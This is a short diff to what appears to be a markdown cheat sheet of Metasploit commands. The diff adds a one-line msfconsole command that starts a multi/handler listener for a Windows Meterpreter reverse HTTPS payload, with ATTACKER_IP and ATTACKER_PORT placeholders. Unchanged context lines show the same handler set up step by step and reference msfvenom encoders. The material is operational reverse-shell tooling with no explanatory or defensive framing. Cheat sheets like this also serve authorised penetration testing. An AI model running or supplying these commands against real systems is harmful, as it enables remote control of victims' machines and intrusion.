@@ -13,6 +13,9 @@ msfvenom --list encoders
 
 ## Multi handler
 ```
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost ATTACKER_IP;set lport ATTACKER_PORT;exploit"
+```
+```
 msfconsole
 use exploit/multi/handler
 set PAYLOAD PAYLOAD
